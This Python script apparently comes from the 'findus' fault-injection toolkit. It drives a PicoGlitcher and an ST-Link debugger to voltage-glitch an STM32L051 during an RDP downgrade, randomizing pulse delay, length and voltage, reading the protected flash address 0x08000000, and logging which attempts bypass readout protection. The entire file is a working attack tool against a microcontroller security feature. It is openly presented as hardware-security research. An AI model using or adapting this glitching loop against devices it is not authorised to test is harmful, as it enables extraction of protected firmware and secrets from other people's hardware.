#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

# connections
# - UART TX: Pin 19 (PA9)
# - UART RX: Pin 20 (PA10)
# - SWDIO: Pin 23 (PA13)
# - SWDCLK: Pin 24 (PA14)
# - LED ERROR: Pin 2 (PC14)
# - LED OK: Pin 3 (PC15)
# - TRIGGER: Pin 22 (PA12)

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus import DebugInterface, Database, PicoGlitcher, Helper

elf_image = "rdp-downgrade-stm32l051.elf"
#elf_image = "dma-uart-stm32l051.elf"

class DerivedDebugInterface(DebugInterface):
    def characterize(self, response:str, mem:int):
        # possibly ok
        if mem is not None:
            if mem != 0x00 and mem != 0xffffffff:
                return b'success: RDP inactive'
            else:
                return b'expected: read empty flash'
        # Error: no connection
        elif "Error: init mode failed (unable to connect to the target)" in response:
            return b'error: no connection'
        # Warning: Polling failed
        elif "Polling target" in response:
            return b'warning: polling failed'
        # Warning: Device lockup
        if "clearing lockup after double fault" in response:
            return b'warning: lock-up'
        # Warning: else
        elif "Warning" in response:
            return b'warning: default warning'
        # expected state
        elif "Error: Failed to read memory at" in response:
            return b'expected: RDP active'
        # no response
        return b'error: no response'

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)

        # if target is powered with external power supply, the power-cycle time must be increased
        self.power_cycle_time = 0.05
        if args.power is not None:
            self.power_cycle_time = 0.5
            self.ext_power_supply = self.glitcher.get_power_supply()

        # trigger on the rising edge of the reset signal
        self.glitcher.rising_edge_trigger(pin_trigger=args.trigger_input)

        # choose pulse-shaping or crowbar glitching and set up the database
        if args.pulse_shaping:
            self.v_init = self.args.vinit
            self.glitcher.set_pulseshaping(vinit=self.v_init)
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "v_init", "v_intermediate"])
        elif args.delay2 is not None and args.length2 is not None:
            self.glitcher.set_hpglitch()
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "delay2", "length2"])
        else:
            self.glitcher.set_hpglitch()
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "number_of_pulses", "delay_between"])
        self.start_time = int(time.time())


        # STLink Debugger
        #self.debugger = DerivedDebugInterface(interface="stlink", target="stm32l0", transport="hla_swd", gdb_exec="gdb-multiarch")
        self.debugger = DerivedDebugInterface(interface_config="interface/stlink.cfg", target="stm32l0", transport="hla_swd", adapter_serial=args.stlink_serial)

        # programming the target
        if args.test and args.program_target is not None:
            print("[+] Programming target.")
            if args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l051.elf", rdp_level=args.program_target, power_cycle_time=self.power_cycle_time, verbose=True)

    def cleanup(self):
        self.debugger.detach()

    def is_programming_necessary(self):
        programming_necessary = False
        unlock_necessary = False
        # check if target needs to be programmed
        rdp, pcrop = self.debugger.read_rdp_and_pgrop(verbose=False)
        print(f"[+] Option bytes: rdp = {hex(rdp)}, pcrop = {hex(pcrop)}")
        if rdp == 0xaa or rdp == 0xcc:
            programming_necessary = True
            unlock_necessary = False
        elif pcrop != 0x00:
            programming_necessary = True
            unlock_necessary = True
        return programming_necessary, unlock_necessary

    def prepare_target(self):
        print("[+] Preparing target.")
        programming_necessary, unlock_necessary = self.is_programming_necessary()
        # write a program to the target and enable RDP level 1
        # unlock should not be necessary, since RDP level should be zero from the last experiment
        # if RDP is already level 1, we don't care and continue
        # steps:
        # - init; halt; program {elf_image}; run; exit
        # - init; halt; {self.processor_name}x lock 0; exit
        # - reset and power-cycle
        if programming_necessary:
            if self.args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            print("[+] Warning: rdp or pcrop not as expected. Programming target with test program (to flash) and enabling rdp level 1.")
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l051.elf", unlock=unlock_necessary, rdp_level=1, power_cycle_time=self.power_cycle_time)

        # check if programming was successful (RDP should be active)
        rdp = self.debugger.read_rdp()
        print(f"[+] Result whether programming was successful: {"ok" if rdp != 0xaa and rdp != 0xcc else "failed"}")
        if rdp == 0xaa or rdp == 0xcc:
            raise Exception("Programming failed.")
        print("[+] Programming finished.")

    def rdp_downgrade(self):
        # load an the controller executable to RAM
        # this will trigger a RDP downgrade to level 0 which will delete the flash content.
        # The controller executable toggles a GPIO pin which we can use to time our glitch
        # steps:
        # - init; halt; load_image {elf_image}; resume; exit
        print("[+] Programming target with program to downgrade to RDP 0 (to RAM).")
        if self.args.power is not None:
            self.ext_power_supply.set_voltage(3.1)
        #self.debugger.load_exec(elf_image=elf_image, verbose=True)
        self.debugger.attach(delay=0.1)
        self.debugger.gdb_load_exec(elf_image=elf_image, timeout=0.7, verbose=False)
        self.debugger.detach()

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        if args.pulse_shaping:
            s_v_intermediate = self.args.vintermediate[0]
            e_v_intermediate = self.args.vintermediate[1]
        elif self.args.delay2 is not None and self.args.length2 is not None:
            s_delay2 = self.args.delay2[0]
            e_delay2 = self.args.delay2[1]
            s_length2 = self.args.length2[0]
            e_length2 = self.args.length2[1]
        else:
            s_delay_between = self.args.delay_between[0]
            e_delay_between = self.args.delay_between[1]
            s_number_of_pulses = self.args.number_of_pulses[0]
            e_number_of_pulses = self.args.number_of_pulses[1]

        # bring the target to a known state
        self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
        time.sleep(self.power_cycle_time)

        experiment_id = 0
        while True:
            # prepare target with test program
            if self.args.test and self.args.program_target != 0:
                self.prepare_target()
            
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            if self.args.delay2 is not None and self.args.length2 is not None:
                delay2 = random.randint(s_delay2, e_delay2)
                length2 = random.randint(s_length2, e_length2)

            # dummy variables (not all are used in each case)
            v_intermediate = 0
            delay_between = 0
            number_of_pulses = 0
            if args.pulse_shaping:
                v_intermediate = Helper.random_point(s_v_intermediate, e_v_intermediate, 0.05, dtype=float)
                ps_lambda = f"lambda t:{v_intermediate} if t<{length} else {self.v_init}"
                self.glitcher.arm_pulseshaping_from_lambda(delay, ps_lambda, 2*length)
            elif self.args.delay2 is not None and self.args.length2 is not None:
                self.glitcher.arm_double(delay, length, delay2, length2)
            else:
                delay_between = random.randint(s_delay_between, e_delay_between)
                number_of_pulses = random.randint(s_number_of_pulses, e_number_of_pulses)
                if number_of_pulses == 1:
                    self.glitcher.arm(delay, length)
                else:
                    self.glitcher.arm(delay, length, number_of_pulses, delay_between)

            # downgrade to RDP0 (this triggers the glitch)
            self.rdp_downgrade()

            # block until glitch
            response = ""
            memory = None
            try:
                self.glitcher.block(timeout=1)
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)
                # read from protected address and characterize debugger response
                memory, response = self.debugger.read_address(address=0x08000000)
                state = self.debugger.characterize(response=response, mem=memory)
                if memory is not None:
                    print(f"[+] Content at 0x08000000: {hex(memory)}")
            except Exception as e:
                print("[-] Timeout received in block(). Continuing.")
                print(e)
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)
                state = b'warning: timeout'

            # further check if something changed
            if b'warning' not in state:
                rdp, pcrop = self.debugger.read_rdp_and_pgrop()
                print(f"[+] Option bytes: rdp = {hex(rdp)}, pcrop = {hex(pcrop)}")
                # rdp changed
                if rdp != 0xaa and rdp != 0x00 and rdp != 0xbb:
                    state = b'ok: RDP value modified'
                elif pcrop != 0x00:
                    state = b'error: pcrop value modified'
                # rdp still enabled -> flash erase failed
                elif rdp != 0xaa:
                    state = b'warning: flash erase failed'

            # power cycle if error
            if b'error' in state:
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)

            # classify state
            color = self.glitcher.classify(state)
            mem_bytes = str(hex(memory) if memory is not None else "None").encode("utf-8")

            # add to database
            state_str = b"state = " + state + b", mem = " + mem_bytes + b", response = " + response.encode("utf-8")
            if args.pulse_shaping:
                self.database.insert(experiment_id, delay, length, self.v_init, v_intermediate, color, state_str)
            elif self.args.delay2 is not None and self.args.length2 is not None:
                self.database.insert(experiment_id, delay, length, delay2, length2, color, state_str)
            else:
                self.database.insert(experiment_id, delay, length, number_of_pulses, delay_between, color, state_str)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            if args.pulse_shaping:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{self.v_init}\t{v_intermediate}\t{color}\t{state}", color))
            elif self.args.delay2 is not None and self.args.length2 is not None:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{delay2}\t{length2}\t{color}\t{state}", color))
            else:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{number_of_pulses}\t{delay_between}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1

            # debug
            #if state == b'success: RDP inactive':
            #    break

            # attack finished
            if experiment_base_id + experiment_id >= 2_500:
                break
            if self.args.oneshot:
                break
            if not self.args.test and (b'success' in state or b'ok' in state):
                print("[+] RDP downgraded successfully. Stop.")
                break
            elif not self.args.test and b'expected' in state:
                print("[-] RDP downgrad unsuccessfully. Try again with a fresh target.")
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--rpico", required=True, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay2", required=False, nargs=2, help="second pulse delay start and end", type=int, default=None)
    parser.add_argument("--length2", required=False, nargs=2, help="second pulse length start and end", type=int, default=None)
    parser.add_argument("--delay-between", required=False, nargs=2, help="delay between pulses for crowbar burst-glitching", type=int, default=[0, 0])
    parser.add_argument("--number-of-pulses", required=False, nargs=2, help="number of pulses pulses for crowbar burst-glitching (can also be 1 for single-crowbar glitching)", type=int, default=[1, 1])
    parser.add_argument("--pulse-shaping", required=False, action='store_true', help="Instead of crowbar glitching, perform a fault injection with a predefined voltage profile (requires PicoGlitcher v2).")
    parser.add_argument("--vinit", required=False, help="Initial voltage for pulse shaping", type=float, default=3.3)
    parser.add_argument("--vintermediate", required=False, nargs=2, help="Intermediate voltage for pulse shaping", type=float, default=[2.0, 2.5])
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--oneshot", required=False, action='store_true', help="abort after one experiment")
    parser.add_argument("--trigger-input", required=False, default="default", help="The trigger input to use (default, alt, ext1, ext2). The inputs ext1 and ext2 require the PicoGlitcher v2.")
    parser.add_argument("--program-target", required=False, metavar="RDP_LEVEL", type=int, default=None, help="Reprogram the target before glitching and set the RDP level (for research only).")
    parser.add_argument("--test", required=False, action='store_true', help="Collect data on a test device. If this option is not supplied, all functions that could reset the targets flash are deactivated.")
    parser.add_argument("--stlink-serial", required=False, default=None, help="Specify the serial number of the ST-Link adapter to use. Helpful if multiple adapters are used at the same time.")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        main.cleanup()
        sys.exit(1)
